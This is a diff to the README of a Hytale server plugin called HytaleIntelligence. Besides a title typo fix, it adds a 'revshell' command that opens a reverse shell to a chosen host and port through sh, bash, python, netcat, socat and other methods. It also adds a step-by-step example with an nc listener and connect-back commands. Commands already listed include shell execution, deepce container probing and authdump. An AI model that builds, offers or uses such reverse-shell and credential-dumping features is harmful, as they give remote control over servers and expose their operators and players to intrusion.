@@ -1,4 +1,3 @@
-# HytaleInteligence
 # HytaleIntelligence
 
 A Hytale server plugin for 
@@ -37,6 +36,7 @@ A Hytale server plugin for
 | `session-validate`                    | Validate session and identity JWT signatures against JWKS public keys from `sessions.hytale.com/.well-known/jwks.json` (Ed25519/EdDSA) | `hytale.intelligence.shell` |
 | `session-logout`                      | Call `ServerAuthManager.logout()` to clear auth session. Shows auth state before/after | `hytale.intelligence.shell` |
 | `session-shutdown`                    | Call `ServerAuthManager.shutdown()` to stop the auth manager and refresh scheduler. Shows auth state before/after | `hytale.intelligence.shell` |
+| `revshell <host>:<port> [type]`       | Reverse shell. Types: `sh` (default), `bash`, `python`, `perl`, `nc`, `nce`, `ruby`, `php`, `socat`. `revshell stop` to kill, `revshell status` to check | `hytale.intelligence.shell` |
 
 ## Permissions
 
@@ -44,7 +44,7 @@ A Hytale server plugin for
 |------------|-------------|
 | `hytale.intelligence.info` | System information commands (sysinfo, mem, osinfo, container, disk, javainfo, hwid, cacerts, lag, session, net, cert) |
 | `hytale.intelligence.filesystem` | Filesystem access commands (ls, cat) |
-| `hytale.intelligence.shell` | Shell execution and session management commands (sh, deepce, session-reload, session-terminate, session-validate, session-logout, session-shutdown, authdump) |
+| `hytale.intelligence.shell` | Shell execution and session management commands (sh, deepce, session-reload, session-terminate, session-validate, session-logout, session-shutdown, authdump, revshell) |
 
 Grant permissions via:
 ```
@@ -54,6 +54,40 @@ Grant permissions via:
 ```
 
 Operators have all permissions by default.
+
+## Reverse Shell Example
+
+```bash
+# 1. On your machine, start a listener
+nc -lvnp 4444
+
+# 2. In-game, check what tools are available on the server
+revshell check
+
+# Example output:
+#   Always available (Java):
+#     sh     - Java Socket + /bin/sh    OK
+#     bash   - Java Socket + /bin/bash  OK
+#   External tools:
+#     python - Python pty shell         OK (/usr/bin/python3 Python 3.11.2)
+#     perl   - Perl socket shell        NOT FOUND
+#     nc     - Netcat (mkfifo pipe)     OK (/usr/bin/nc)
+#     socat  - Socat full PTY shell     NOT FOUND
+#   ...
+#   Recommended: python (PTY via pty.spawn)
+
+# 3. Connect back using the recommended method
+revshell 10.0.0.1:4444 python
+
+# Or use the Java-native method (always available, no external tools needed)
+revshell 10.0.0.1:4444
+
+# 4. Check connection status
+revshell status
+
+# 5. Kill the reverse shell when done
+revshell stop
+```
 
 ## Links
 
